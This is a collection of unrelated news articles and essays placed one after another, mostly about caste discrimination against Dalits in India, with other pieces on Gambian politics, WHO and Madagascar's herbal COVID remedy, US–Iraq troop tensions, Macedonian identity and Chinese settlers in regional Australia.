Journey of Gangadhar Patil with 101Reporters Technology, backbone of 101Reporters Grassroots reporters, the biggest strength of 101Reporters author: Delhi: A Delhi-based organisation is equipping the members of the Scheduled Castes with digital literacy to help them thrive in the gloomy economic scenario. Ashok Bharti, chairperson of the Dalit-Adivasi collective National Confederation of Dalit Organisations (NACDOR), told 101Reporters they have enabled about 290 small-time entrepreneurs from socially disadvantaged groups gain employment in the past few months. He added that though India is struggling through a pandemic, these entrepreneurs have cumulatively earned over Rs 5 crore in the first five months of the lockdown period. Bharti underlined that the aim of their programme, being run in collaboration with Tata Consultancy Services, is to bridge the digital divide between the rural and urban India.“The task was to impart functional literacy of computers among the educated youth [belonging to socially disadvantaged groups], who could then be incentivised into teaching,” he said. Meera Ahirwar, 25, a resident of Gor Gai village in Madhya Pradesh’s Chhatarpur district, was given training in digital skills. In return, she has to impart the skills to the students of her village government school. She’d be given a stipend for this. With a postgraduate degree in Geography and a bachelor’s degree in Education, she would find it difficult to secure a job as she belonged to the Dalit community. She would even have to face casteist taunts en route to the local school she taught at. She quickly learned to execute various digital tasks like online banking, utility bill payment and extending benefits of various government schemes through the internet. This enabled her to set up her own kiosk in 2019. Now, she helps people make transactions, apply for scholarships and other schemes. During the pandemic, when banking facilities were hampered because of the lockdown, Ahirwar’s kiosk attracted people from even far off villages. “Migrant workers who were stuck in different parts of the country during the lockdown were able to transfer money to their family members in the villages through e-payment,” she told 101Reporters. She said she also helped people procure e-passes, which were necessary for inter-city or interstate movement during the lockdown. Even the upper-caste villagers who used to mock her and not avail of her kiosk would now seek her help as all the other internet access points near the village were closed owing to the lockdown. “Initially, they would make sure that they would maintain as much distance as possible while interacting with us in our shop, but gradually the distance blurred,” underlined Ahirwar. The increased transactions during the lockdown period bumped up earning of many entrepreneurs, and it has helped them expand their business. Lifeline for villages Ujwal Mondal, 31, a resident of West Bengal’s North 24 Parganas district, earned Rs 80,000 to Rs 1 lakh each month from his three shops in Hingalganj block during the lockdown. He recently received a tender from the state government to register the people eligible for Samajik Suraksha Yojna, a scheme that provides provident fund to the workers in the unorganised sector. “I have to go to each house in the village and find out the people who are eligible for the scheme. After that I register their names online by filling a form,” stated Mondal, adding that about 75 people visit his kiosks every day. Mondal mentioned that people visit him to make changes in their Aadhaar cards and seek help in obtaining different certificates like for caste or marriage. Previously, people would have to get it through the village authorities but now they download the forms, get them filled, sign and upload them. There are 21 such entrepreneurs from the three clusters in North 24 Paraganas district. One of the cluster leaders Subarna Mondal mentioned that though their business was affected at the start of the lockdown, it picked up within 15-20 days when people realised the potential of online transactions. “People who had never done an online transaction in their lives came looking for us to withdraw cash from their accounts,” she added. In addition, Mondal said the entrepreneurs also helped fill up forms of the people who were entitled to cash support under various central and state government assistance programs. When the money for Ujjwala Yojna, PM Kisan Yojana and several other state government schemes, including financial assistance for the Amphan Cyclone, came into the account of the beneficiaries, they came to our kiosks to withdraw the money, she added. Interventions such as the digital literacy drive have come as a relief not only for the ones receiving the training but also for the society they live in, connecting many with the world wide web.   101Reporters #1886, 2nd Floor, 8th Cross, 4th Main, New Thippasandra, Bangalore, Karnataka, India - 560075+91 73491 28853 | [email protected] Copyright ©2021 Off Road Media Pvt Ltd"

0,"Text—a clue to my memory and history Literature is a must for revolution. And if the revolution seeks to resurrect the “human personality” then literature is essential. The primary function of caste is to destroy the sense of humility; to make men so incapable of thinking beyond their caste that even violence against a person from another caste does not provoke them to take action to stop it. In fact, caste society, backed by mythological stories, its existence justified by Vedic-brahmanic religious texts, is akin to a crafty and violent PUBG game in which each character’s role has been pre-decided and breaking of whose rules culminates in a punishment that is violent, sadistic, unnatural and dehumanising. Brahmins are the creators and protectors of this ancient PUBG game called the caste system. After having played this unnatural, irrational and illogical game for centuries, the role assigned to each character has developed an abnormal social psychology. Coming out of this abnormality in such an ill-formed society, and to accept “common sense”, is no less than a revolution. Also read | Ambedkar: Shakespeare and Other Literary Pursuits In 1956, Ambedkar embraced Buddhism in Nagpur, and half a million Mahars followed him too. Theirs was a declaration of war against irrationality and the abnormality of the caste system; the PUBG created by the brahmins. Six-and-a-half decades later, they are still fighting what is perhaps the longest non-violent battle in human history. Their battle has been made possible by the literature they have been producing ever since this war began. Making a gun or another weapon to fight a battle is evidently easy, but producing literature for it is a time-consuming, painstaking and emotionally rigorous act, especially when the oppressors have told the writers no history of their ancestors. Writers of such revolutions are entirely dependent on memory or the oral history of their community. Memory dies if it is not passed on to the next generation. Oral history is lost when it is not communicated to the generations that follow. In both circumstances, historical identity is lost. And it is this historical identity that dalits require, to own and to continue their resistance against a society that enslaved them for centuries. Even for me, this is only possible when the memory and history of my ancestors is converted into text. Memory—the abode of my history What is memory? Its textual definition says that it is a faculty of the mind that restores information. But how come some communities, or at least some people, have memories of their great-great-great-great grandparents and some of us do not even know the names of our father or mother or of our grandparents, nor have any other information about them? How come the few who have these memories of their past are proud of it, while most of us do not have it at all? In India, the function of memory has very different connotations when we speak about dalits (the ex-untouchable communities). I think it was some fifteen years back that my grandfather died. I do not remember the exact date or year. And on 3 May, my grandmother died. She was about 95 years old. But her voter identity card, though it does not mention the exact date or year of her birth, says that she was 61 years old in 1991. Now that both my grandparents are gone I simply cannot recall them because, as I mentioned earlier, there was no memory passed from them to me, nor was an oral history of anything communicated to me by them. This was not their fault. The hardships of life and circumstances are to blame. Excluding a few cases, this is the situation with most of us dalits. We simply do not have a bridge of communication that can lead us to the history of our families. Interestingly, in the absence of such family-community histories, sooner or later, we are enslaved, or found governed by those dominant (also oppressive) ideologies of state and society that are powerful. This is a realisation which is yet to come to most communities (castes) in India. But it had come, as early as in 1927, to the mahars (Buddhists since 1956) in Maharashtra and thus was laid the foundational brick for dalit literature. Also read | Ambedkar: A Spartan Warrior who Made Knowledge and Justice his Weapon In the beginning, they had nothing but a fractured oral history. In the brahmanical religious scriptures, the mahars were mentioned as despicable. But in their memory, and in their oral history, they were fighters; intelligent and cultured people. As Babasaheb Ambedkar argued, the mahars had been Buddhists for centuries. Soon, the stories, poems and songs produced by them attested to their claims on their oral history, and thus began the arrival of the mahar community into textual memory. This arrival was fresh and political. It had an objective: to deny the brahmanical version of history and memory and to convert oral history into textual form so that it would prevail for generations to come. Today, both my grandparents are gone. I can only make some sense of longing for them because of the literature written by a few among us. It is because of dalit literature that I can imagine the historical self of my grandparents and come to an understanding of their circumstances, struggle and survival. It is because of dalit literature that I can feel respect for their existence, even though I did not share intimate moments of communication with them, nor heard stories from them, nor was caressed by them. It is in these fractured memories and painful lives that dalit writers have found a sense of belonging and history. And it is in this textual memory that I find the abode of my history today. Death—the inability to be in text Non-dalits may find it unbelievable, but death for dalits is metaphorical. An “untouchable” never existed as a person worthy of respect from society or recognised as a mind. He was simply invisible, except when his labour was extracted, exploited and used for free. Thus it was not very difficult for dalits from a few generations ago to understand how it feels to remain invisible. This reality has not ceased to exist even today, although its forms vary. Not existing for others, not being recognised by others, is a condition of simply not being extant. It is in this sense that death is metaphorical for dalits. Yet, this is not a normal reality. It is an abnormal condition, an ecology, to use a broad term, that has been constructed by brahmins and all other castes who follow them. Also read | Dalit Women as Active Participants in Ambedkarite Movement This abnormality, too, was first understood by dalits in Maharashtra and dealt with by establishing a body of dalit literature. Those who simply did not exist in the eyes of caste Hindus and brahmins in society have arrived at the centre-stage of stories, histories and memories via dalit literature. Gradually, and surprisingly, their arrival in textual form is being recognised by the world and this community has been reborn in the imagination, both literary and historical, of the world. Text—as history and memory—being the most effective tool to keep our sense for resistance against enslavement of any kind alive, proved to be a resurrection from social death for mahars (Buddhists) and a few other dalit castes in Maharashtra. Then, suffice to say that as long as the caste system will prevail, physical death for dalits will always remain metaphorical. Their actual death lies in an inability to be in text, or transform into a text as a story, memory and history. But before death, there is life. And here, dalit literature today proclaims their passionate existence, and passion for life. .jnews_6138da8730c08 { color : #000000; } .jnews_6138da8730c08.footer_light a, .jnews_6138da8730c08.footer_dark a { color : #000000; } .jnews_6138da8730c08 input:not([type=""submit""]),.jnews_6138da8730c08 textarea,.jnews_6138da8730c08 select,.jnews_6138da8730c08.footer_dark input:not([type=""submit""]),.jnews_6138da8730c08.footer_dark textarea,.jnews_6138da8730c08.footer_dark select { background-color : rgba(0,0,0,0.01); } .jnews_6138da8730c08 input:not([type=""submit""]),.jnews_6138da8730c08 textarea,.jnews_6138da8730c08 select,.jnews_6138da8730c08.footer_dark input:not([type=""submit""]),.jnews_6138da8730c08.footer_dark textarea,.jnews_6138da8730c08.footer_dark select { color : #000000; } .jeg_footer .jnews_6138da8730c08 input[type=""submit""], .jeg_footer .jnews_6138da8730c08 .btn, .jeg_footer .jnews_6138da8730c08 .button { background-color : #000000; } © 2021 Indian Cultural Forum | This work is licensed under a Creative Commons Attribution-NonCommercial-NoDerivatives 4.0 International License Login to your account below    Fill the forms bellow to register    Please enter your username or email address to reset your password.

Dibba-Wadda, a former African Development Bank human capital chief, officially converted to UDP at a ceremony held in Pipeline today. “Be visible and be heard so that those people in Nyakoi who have never seen Oley Dibba would say, ‘oh this is Oley Dibba’, or those people in Saloum would say, ‘oh this person is Oley Dibba’,” Mr Darboe asked of Dibba-Wadda, who is now the president and chief executive officer of Gam African Institute for Leadership, a non-profit organisation that works towards providing and equipping African youths with skills to grow into leaders. Mr Darboe then praised Dibba-Wadda on her decision to join UDP saying “when I read your profile, it became quite apparent to me that it’s people of your calibre of both sexes that one would need in a political organisation.” “For us, our party is a government and certainly governments attend to the affairs of the state, and we think we can attend to the affairs of the state in a manner that is constructive but other would see it as opposition talk. But I think with people like you, your contribution would hardly be seen by anyone as just mere opposition talk,” the UDP leader said."

0,"POSTED ON NOVEMBER 2, 2020 The 16-year-old Dalit girl in Kerala’s Idukki, who attempted to suicide following an alleged sexual assault, succumbed to her injuries on Saturday. The girl, who suffered major injuries during the attempt to take her life, died at the Thiruvananthapuram Medical College, where she was under treatment. It was last Saturday that the teen, who is a native of Nariyampara in Kattappana, tried to take her life at her house. A few days prior to the incident, the family had filed a complaint against an auto driver in the region, stating that he sexually assaulted her. The man allegedly sexually assaulted her after falsely promising to be in a relationship with her. The girl, who was first rushed to a local hospital in the region, was then transferred to Kottayam Medical College. From there, she was taken for specialist treatment to Medical College Hospital in the state capital. Though her condition was slightly improving, her health further deteriorated on Saturday and she succumbed, reports Malayala Manorama. The accused, identified as Manu Manoj, was arrested only after the girl attempted suicide. Though there were reports that there has been a delay in arresting the accused, police officials of Kattappana station had told TNM that he was absconding. The 24-year-old accused was booked on charges on rape and various offences under Protection of Children from Sexual Offences (POCSO) and on charges of Scheduled Caste and Scheduled Tribe (Prevention of Atrocities) Act. The accused was a member of Democratic Youth Federation of India (DYFI), youth wing of the CPI(M). He was removed from the party after his name surfaced in the case. The DYFI leaders in Idukki had told TNM that the accused was not holding any leadership positions in the party and was just a member.

Dalit Ezhilmalai, former Union Minister of State for Health in the Vajpayee Cabinet, died at his residence on the outskirts of Chennai in the early hours of Wednesday. He was 74. He is survived by wife, three daughters and a son. According to his family, the end came suddenly as he did not have any apparent illness. The funeral will take place on Wednesday evening.  Born in Irumbedu village in Madurantakam taluk of Chengalpattu district on June 24, 1945, Mr. Ezhilmalai served the erstwhile Post & Telegraph Department between 1963 and 1987. During this period, he was sent on deputation to the Army for five years up to 1974. He took part in the Indo- Pakistan War of 1971 and was a recipient of Sainik Sewa Medal from the President for meritorious service in the Army. Even while in the government service, he held key positions in the National Federation of Postal Union and Scheduled Castes and Scheduled Tribes Employees Association Co-ordination Committee, Tamil Nadu and Puducherry, besides launching the Dalit People's Front in 1980. Also read: Opinion divided on fielding common Dalit candidates in reserved seats After the formation of the Pattali Makkal Katchi in 1989, he joined the party and became its general secretary. In the 1998 Lok Sabha election, he was elected from the Chidambaram (reserved) constituency when the PMK contested the poll as part of the AIADMK-led coalition. In March 1998, he was made Union Minister of State for Health and Family Welfare with independent charge. However, in August 1999, he quit the PMK as he was denied the party nomination to contest again from the constituency. Later, he joined the AIADMK. In 2001, when the by-election to the Tiruchi Lok Sabha constituency took place, he was again elected to the House. His victory became noteworthy as he had scored success in a general constituency, an uncommon feature. For long, he had maintained a low profile, though he continued in the AIADMK and remained an admirer of former Chief Minister Jayalalithaa. In a statement, Edappadi K.

0,"Punch Newspapers punchng.com © 1971-2020 The Punch newspaper Sodiq Oyeleke The World Health Organisation says it met with 70 traditional medicine experts in a bid to find a cure for the coronavirus pandemic. WHO African Region made this known via its Twitter handle on Tuesday. The health organisation said an agreement was reached with the herbal medicine experts on clinical trials of their remedies.  The PUNCH reports that the meeting is coming days after Madagascar said it found an herbal remedy capable of curing the disease. @WHOAFRO tweeted, “70 traditional medicine experts from countries across #Africa held a virtual meeting with @WHO on the role of traditional medicine in the #COVID19 response. “They unanimously agreed that clinical trials must be conducted for all medicines in the Region, without exception.” Earlier, Madagascar President Andry Rajoelina criticised WHO and other international organisations for allegedly scorning local “remedy” for COVID-19. “If it wasn’t Madagascar, and if it was a European country that had actually discovered this remedy, would there be so much doubt? I don’t think so,” he told French media in an interview. Before the meeting, WHO had repeatedly warned that the COVID-Organics infusion, which Rajoelina has touted as a remedy against the deadly coronavirus, has not been clinically tested. But Madagascar claimed the drink is derived from artemisia – a plant with proven anti-malarial properties – and other indigenous herbs. Already Equatorial Guinea, Guinea-Bissau, Niger, and Tanzania have taken delivery of consignments of the potion, which was launched last month. Also, Nigeria’s president, Major General Muhammadu Buhari (retd.), has approved the importation of the remedy. Copyright PUNCH. All rights reserved.

A book fair was also held during the festival at Kirori Mal College in which students and visitors enthusiastically took part in. Many well-known publishers participated in it.

0,"National Commission for Scheduled Castes Vice Chairman L Murugan speaks to reporters after meeting the Dalit youth. Bhopal: The National Commission for Scheduled Castes on Tuesday directed the Sagar district police in Madhya Pradesh to submit a report within a week in connection with the setting ablaze of a Dalit youth on January 14. Dhanprasad Ahirwar (24) was doused with kerosene in Dharmshri Colony, some 170km from here, over a dispute allegedly by a group of 15-20 men, five of whom were arrested later. ""I have directed the Sagar Superintendent of Police to submit action taken report within a week,"" National Commission for Scheduled Castes Vice Chairman L Murugan said after meeting Ahirwar who is undergoing treatment for 60-65% burns at Hamidia Hospital here. Amid reports of the victim not getting proper treatment at the local hospital, Murugan said the authorities here have been told to shift Ahirwar to Safdarjung Hospital in New Delhi. The NCSC vice chairman said Ahirwar will get Rs 4 lakh as assistance under the SC/ST Act and demanded that he be given additional relief from the chief minister's fund. Murugan said Ahirwar's kin had told him the accused, all of whom belong to a particular community, had assaulted him a week before this incident but police, at the time, had failed to take action. He said only five persons have been held while Ahirwar's kin have claimed a mob of 15-20 people had attacked their house on the fateful day and five of them had set him ablaze. The family members were able to identify only five of the attackers. Murugan told reporters he has instructed the Sagar SP to include all the unidentified men in the FIR lodged in the case and also book the policemen who did not showed for alleged slackness in registering the victim’s complaint under Section 4 of the ST/SC (Prevention of Atrocities) Act. Meanwhile, the state Bharatiya Janata Party (BJP) unit has accused the Kamal Nath-led Congress government of shielding the culprits. Senior BJP leader and former minister Lal Singh Arya said, “We would rest till the victim is given justice.” Hitting out at the ruling camp for its alleged apathy, Arya said no senior Congress leader has visited the Dalit youth. “Despite severe burn injuries, the authorities kept him in a non-AC room in the Bhopal hospital, forget sending him to Safdarjung in Delhi,” he said, while demanding Rs 10 lakh compensation from the state government for Ahirwar.

The image of the EU did not suffer from the Covid-19 crisis. Awareness of the Recovery Plan for Europe is low, which is detrimental to confidence in Brussels. Nearly two-thirds of all Bulgarians think that the EU is needed, especially in this crisis. The majority of the respondents are firm supporters of democracy, but two-fifths of the surveyed nationals do not consider democracy appropriate in crisis management like the current one. 51% of the respondents want the EU to undertake common actions to exit the crisis. 46% think that a nation state should be at the forefront. 81% of the respondents say that limiting the spread of the epidemic is everyone’s responsibility.

But for one 62-year-old woman, the day turned out to be another reminder of evils that have plagued the country long before the day we sent the British back home. Amrutham Amma, the president of a panchayat in Tamil Nadu was stopped from hoisting the flag at a school in her village this Independence Day, apparently by a few other upper-case Hindu panchayat members who didn’t want a Dalit woman to do the important job. The panchayat president was not allowed to hoist the flag because she belongs to Scheduled Caste (SC) and a few villagers prevented her from doing the honours citing her caste. https://t.co/fBTObCqe5P — Deccan Herald (@DeccanHerald) August 20, 2020  On Thursday, however, Amrutham asserted her citizenship. Surrounded by authorities, including police officers, and a few of her supporters, she finally went on to hoist the tricolour at her panchayat office. “Today’s the real Independence Day for me. I have no words to describe my happiness,” she was quoted as saying after the event. On Aug 15th Athupakkam Panchayat sarpanch dalit lady Amrutham had not been allowed to hoist the tricolour. Yesterday, the District Collector & SP righted the wrong by welcoming her with a bouquet & having her unfurl the flag! She said “Today is the real Independence Day for me!” pic.twitter.com/tOL0Bt8pv1 — sanjoy ghose (@advsanjoy) August 21, 2020 One panchayat secretary was, meanwhile, suspended for not allowing her to hoist the flag on Independence Day. Another two men were also arrested for attacking a reporter who tried to cover the caste discrimination in the village following the incident. In later interviews, Amrutham Amma, who was elected as panchayat president last year on a seat reserved for the Scheduled Caste community, said the discrimination in her village was systemic. Apart from being denied the few kilogrammes of rice that was given out as aid, she said her family has also faced threats to their lives, while she was once asked to vacate the chair reserved for panchayat leaders in her office only for being a Dalit woman. ""From being denied the chair reserved for panchayat leaders to sit in the office, to being denied a few kgs of rice given as aid, even before her victory, the panchayat president has faced it all,"" writes Bharathi SP.https://t.co/GB0wzJtyG7 — The Quint (@TheQuint) August 21, 2020  This isn’t the first time she has been blocked from hoisting the tricolour either. On Republic Day this year, she told reporters that she was verbally abused when she went up on stage by the former panchayat president V Haridoss. She quickly climbed down from the podium. “It was clear from the way they looked at me that they did not want me to get on stage,” she was quoted as saying in The News Minute. If there is one story you read today, let it be about Amrutham amma and her defining image. @aadhirabharathi writes on how a Dalit woman leader asserted her right and hoisted tricolour on August 20 and her struggle started on Republic Day. https://t.co/sFIsRUJVmS — Dhanya Rajendran (@dhanyarajendran) August 20, 2020  This discrimination, she said, has also stopped her from carrying out basic development projects in the village, which included monitoring the work undertaken under the Mahatma Gandhi National Rural Employment Guarantee Scheme. Hopefully, now that action has been taken against a few authorities, Amrutham Amma will be able to continue working for the people who elected her. However, given our country’s history of caste discrimination, it may be too early to tell. Arré Bench The Arré bench delivers stories that mattress. It hasn't achieved much sofar. But it's getting bedder.  Did you like it? Tell us what you think so we can give you more content you like : There are a slew of Instagram accounts run by media professionals dedicated to irritants and inside jokes of their job and industry. Lately, the conversation has slowly moved from the likes of “This client said this silly thing” to “My agency promotes mental health as long as it involves a yoga class, not reasonable work hours or manageable workloads. Haha. Fun.” This shift from LOLs and low-key whining to simmering aggression about toxic work culture during the pandemic is an eye-opener. We’ve all heard of Javed Khan, the rickshaw driver who sold his wife’s jewellery to convert his vehicle into a mobile ambulance. Though heartening, these tales of sacrifices make me gloomy. Each one of these positive stories come with the unsaid failure by the state or those in a better position to help. As the second wave continues to batter India, “woke” media organisations and ad agencies are all about well-being and mental health. The problem arises when this performance of empathy does not extend to their employees. Stories of bosses expecting you to work beyond office hours and making one demand after another on WhatsApp groups are all too common. There are several reasons why this second wave of the coronavirus may prove to be more lethal than the first one. Most of it has to do with Indian behavioural impulses. Indians haven’t been able to stand in a queue for the longest of time and it comes as no surprise that the pandemic-taught etiquette has worn off. In Dwarka, a man was so angry with his mother for getting into an argument with a neighbour that he slapped her in public. She died. Her death should be seen as the moment we call out the many abusive relationships the elderly live in, with death as their only escape.

0,"He explained that Tito was against Bulgarian identity in the geographical region of Macedonia & started the propaganda A YouTuber from Germany with heritage from the country known today as “North Macedonia”, has uploaded a new video that he said is a “very controversial topic” and that he was “contemplating if I should discuss it at all”. The topic? The reclamation of his Bulgarian identity and renouncement of a Macedonian one. The YouTuber Bobby’s Perspectives has just under 100,000 subscribers and a total of 4.65 million views. At the beginning of the video he said this is “for my Balkan brothers and sisters. For my Bulgarian brothers and sisters. For my Greek brothers and sisters. For my Serbian brothers and sisters. But more importantly… most importantly actually, this video is for my ‘North Macedonian’ brothers and sisters,” using hand signals to invert comas to North Macedonia. The YouTuber, speaking in a very thick typical German accent, explained that his followers know him to identify as a Macedonian-Slav but that he was not overly patriotic because he was raised in Germany. He emphasised that he is a truth seeker, and this is reflected in his videos about diet and religion. However, in his quest for truth seeking, it took him down a road that surely he would have never expected… His very own identity. “I did my research, objectively. I investigated the Greek side. I investigated the Bulgarian side. I investigated the rest of the world. I investigated the Osman [Ottoman] archives, the Turkish archives. I investigated the ‘Macedonian’ claims’,” the YouTuber said, who went on to say that Slavs first arrived in the Balkans 900 years after Alexander the Great’s death. The next part of the video would have taken many people by surprise. See Also: What did ancient languages sound like? (video) 200 years since the 1821 Greek Revolution – Prince Charles in Athens (photos) “I am talking from the heart, I’m talking to my fellow ‘North Macedonians’, and even I cannot accept that name any longer,” as the camera zooms into his fingers doing inverted comas. The reason why he no longer accepts the name Macedonian? “Because Macedonia was Greece, and it is well established and historical truth – as simple as that. We are not the descendants of Alexander, we are Slavs,” he emphasized.  The YouTuber then explains that many historical figures, such as Tsar Samuil the Bulgarian and Gotse Delchev, are claimed as Macedonian, but are in actual fact Bulgarian – just in case Tsar Samuil “the Bulgarian” was not obvious enough. In fact, Byzantine Emperor Basil II had the nickname “the Bulgar Slayer” as Tsar Samuil the Bulgarian was his greatest adversary. See Also: Murder of Solomos Solomou: This is how his assassination was ordered Great city routes to explore on foot in Athens He then references Ottoman records that noted in the geographic region of Macedonia there were many ethnic groups, including Greeks, Bulgarians and Jews, but never a separate Macedonian ethnicity listed. The YouTuber explained that Josip Broz Tito, the communist dictator of Yugoslavia, was against Bulgarian identity in the region of Macedonia and started the propaganda, killing those who continued to identify as Bulgarian. “My great-grandfather was haunted by the Serbs for saying he was Bulgarian,” he said.

0,"BAGHDAD — The Trump administration on Friday rebuffed demands from Iraq's prime minister to begin planning for the withdrawal of U.S troops from Iraq. Iraq's prime minister, Adel Abdul-Mahdi, told Secretary of State Mike Pompeo in a phone call Thursday to send a U.S. delegation to Iraq to negotiate the withdrawal of U.S troops, according to a statement released Friday by the Iraqi leader. But the State Department's chief spokeswoman said the U.S. presence in Iraq is a ""force for good"" and U.S. officials would not discuss a military withdrawal. ""At this time, any delegation sent to Iraq would be dedicated to discussing how to best recommit to our strategic partnership – not to discuss troop withdrawal, but our right, appropriate force posture in the Middle East,"" said Morgan Ortagus, the spokeswoman. During a news briefing Friday about new Iran sanctions, Pompeo said he would be ""happy to continue the conversation with the Iraqis about what the right structure is"" for U.S. troops in the country. But, Pompeo added, the U.S. military mission there ""is very clear"": to train Iraqi security forces and fight the Islamic State. ""We're going to continue that mission,"" he said. America's military presence in Iraq has become a flashpoint between the two allies after President Donald Trump's decision last week to kill a top Iranian general who was in Baghdad. Trump ordered a drone strike that killed Gen. Qasem Soleimani, who led an elite unit of Iran's Revolutionary Guard Corps. The strike also killed an Iraqi military official, Abu Mahdi al-Muhandis, who was the deputy commander of an Iran-backed militia organization known as the Popular Mobilization Forces. Abdul-Mahdi has called the U.S. strike a political ""assassination"" and a violation of Iraqi sovereignty. Trump administration officials have defended the strike as legal and necessary, saying Soleimani was planning attacks on U.S. assets in the region. But they have declined to provide evidence of the plot and have given conflicting accounts of how ""imminent"" it was. ""There is no doubt that there were a series of imminent attacks that were being plotted by Qasem Soleimani, and we don’t know precisely when and we don’t know precisely where, but it was real,"" Pompeo said during an interview with Fox News that aired Thursday. Trump campaigned on a promise to bring U.S. troops home from far-flung ""endless wars,"" and he has ordered drawdowns in Syria and Afghanistan. The U.S. has an estimated 5,000 American troops in Iraq, but Trump has resisted Iraq's pressure to bring them home. Such a move would be fraught with political and national security implications, including a possible resurgence of the Islamic State. ""A complete US military withdrawal in the current context would be disastrous,"" William Wechsler, director of the Middle East programs at the Atlantic Council, a foreign policy think tank, wrote in a recent Jan. 5 analysis. For starters, it would ""abandon Iraq to Iranian influence"" just as Iraq is choosing a new prime minister, said Wechsler. Iranian leaders have said their main goal in the wake of Soleimani's death is to drive the U.S. out of the Middle East. A U.S. withdrawal now could also pave the way for a resurgence of the Islamic State, also known as ISIS. It would be a ""gift to ISIS,"" Sen. Christopher Murphy, D-Conn., a member of the Foreign Relations Committee, said at an Atlantic Council forum on Thursday. ""This is an incredibly dangerous moment,"" Murphy added, referring to the potential for both Iran to expand its influence in Iraq and for ISIS to make a comeback there. Iraq's parliament on Sunday approved a nonbinding resolution calling for U.S. troops to leave. U.S. officials have noted the vote was taken when Sunni, Kurd and some Shiite lawmakers, who hold more favorable views toward the U.S. military mission, were not present. Pompeo suggested the anger at the U.S. in Iraq would pass, and he noted that the current prime minister is on his way out of office. ""We’ve been in their country, we’ve been supporting Iraqi sovereignty, we’ve been continuing to take down the terrorist threat against the Iraqi people,"" he said Sunday on Fox News. ""The prime minister is the resigned prime minister ... We are confident that the Iraqi people want the United States to continue to be there to fight the counterterror campaign."" But Abdul-Mahdi's comments to Pompeo suggests he is pushing ahead with that demand, despite his own caretaker status and the recent steps toward de-escalation between Tehran and Washington that have put Iraq on the brink of a proxy war between the U.S. and Iran. More:Iran got its revenge for Qasem Soleimani's killing but the US Navy is still a target More:Iran plane crash: U.S., Canada say intel shows Ukraine jet downed by Iranian missile The Iraqi leader asked Pompeo to ""send delegates to Iraq to prepare a mechanism to carry out the parliament's resolution regarding the withdrawal of foreign troops from Iraq,"" said the statement from Abdul-Mahdi. ""The prime minister said American forces had entered Iraq and drones are flying in its airspace without permission from Iraqi authorities and this was a violation of the bilateral agreements,"" the Iraqi leader's statement added. Ortagus said the U.S has been ""unambiguous"" about how crucial the U.S. mission is in Iraq. American troops are there to help fight the Islamic State. She said U.S. officials are willing to talk to Iraqi leaders, but not about withdrawing. ""There does ... need to be a conversation between the U.S. and Iraqi governments not just regarding security, but about our financial, economic, and diplomatic partnership,"" she said. ""We want to be a friend and partner to a sovereign, prosperous, and stable Iraq."" More:House votes to limit Trump's ability to wage war with Iran after Soleimani killing Top American military officials including Gen. Mark Milley, chairman of the Joint Chiefs of Staff, and U.S. Defense Secretary Mark Esper have said there are no plans for the U.S. to withdraw from Iraq. But military officials sowed confusion about the U.S. commitment earlier this week, when a letter, written by U.S. general to Iraqi officials, suggested the U.S. was preparing to withdraw because of the Iraqi parliament's vote. Esper and Milley told reporters it was a draft letter and a mistake. Simmering tensions between the U.S. and Iran escalated sharply after Dec. 27, when a rocket attack, blamed on an Iranian-backed militia group, caused the death of an American contractor at a base in Kirkuk province. The U.S. responded with a barrage of strikes on the militia's bases, killing at least 25 people. Pro-Iranian protesters then stormed the U.S. embassy in Baghdad, temporarily stranding diplomats inside and leaving parts of the compound damaged and charred. Trump then ordered the Soleimani strike. Iran responded by launching more than a dozen ballistic missiles at two Iraqi bases that house U.S. and coalition forces. No Americans or Iraqis were killed in the Iranian strikes. And tensions began to ratchet down Wednesday when Trump said Iran seemed to be ""standing down"" and he, too, signaled that Washington would be stepping away from further confrontation.

0," Historian Juanita Kwok studies Chinese agricultural and wartime contribution in regional Australia When historian Juanita Kwok delves into the stories of Chinese people during the early development of regional towns, she starts by looking from the ground up. ""I would walk in Bathurst cemetery and look out for Chinese graves,"" Dr Kwok said. ""Some of the Chinese were baptised and so they are buried in different sections, such as the Old Church of England section, the Roman Catholic section and the Presbyterian section."" From the 1850s many Chinese men initially came out to try their luck for gold, but Dr Kwok said many others arrived to work in food production and often married women of European backgrounds. Dr Kwok said many Chinese men from the Central West region of New South Wales were trailblazers in vegetable growing. ""Many Chinese became successful commercial market gardeners, sending their produce in large quantities to Haymarket,"" she said. ""They also brought technology for raising water, pumping water from the rivers which made it possible for them to irrigate the land, and they brought that technology from their villages via the goldfields. ""Around the end of the 19th century, they were the ones who pioneered vegetable growing in rural NSW. ""They really laid the foundations for European farmers to follow in their footsteps."" The Chinese farmers' success in growing vegetables was to the ire of others who were often unsuccessful in local agricultural show judging awards. A review of the 1886 Bathurst Exhibition, published in the Bathurst Free Press and Mining Journal, acknowledged the success of Chinese entrants: ""Australian gardeners, what, are you about to let John Chinaman lick you in vegetables? Is the vegetable kingdom to pass wholly over to the Chinese?"" Dr Kwok said there were challenges in tracking down descendants of early Chinese immigrants, in particular women who changed their surnames when they married. ""There were other cases where people changed their names in order to fit into society so that their children wouldn't be discriminated against,"" she said. ""Chinese people were looked down on in society as Australia went into a long period of White Australia. ""There was so much legislative discrimination against Chinese people that parents of children probably thought it was better for their children's future if they were disassociated from their Chinese heritage."" Dr Kwok said it was rewarding to meet descendants who were aware of their family backgrounds. ""It's been really exciting meeting with people who are really proud of their Chinese heritage and to rediscover their Chinese roots,"" she said. Dawn Brownlow's grandfather arrived in Australia during the turn of the 20th century and was a market gardener in the White Rock and Brewongle areas. Her Australian-born father, Charles Yow Jr, worked as a postal department worker and would also help his brother, Reginald, at his market garden in Bathurst. The men were all buried at the local cemetery where their gravesites remain today. With their mother, Ellen nee Schofield, who was raised with Irish Catholic traditions, Ms Brownlow and her seven siblings grew up in a household with a mix of cultural traditions. Family meals would include stir fries with rice throughout the week with steamed fish on Fridays. ""My mother recounted stories of how fantastic it was to come to a Chinese funeral because they would cook a whole pork and you got a penny and you got lollies,"" Ms Brownlow said. In 1939, during WWII, Charles Yow Jr enlisted in the army and served throughout the Middle East, the Mediterranean and the Pacific, Ms Brownlow said. ""He was an expert in dismantling machine guns and putting them back together,"" she said. ""My dad is an Australian-born Chinese who fought for this country. ""He had shrapnel in his back till the day he died."" Charles Yow Sr was a member of the Bathurst Chinese Masonic Lodge, a mutual aid society run out of a town building established in 1921 and demolished in 1953. Today, Ms Brownlow wears a pendant made from her late grandfather's lodge membership badge. The heirloom is a reminder of her ancestors and their contribution in the early development of regional Australia. ""I'm extremely proud, I would shout it from the top of The Carillon,"" she said.

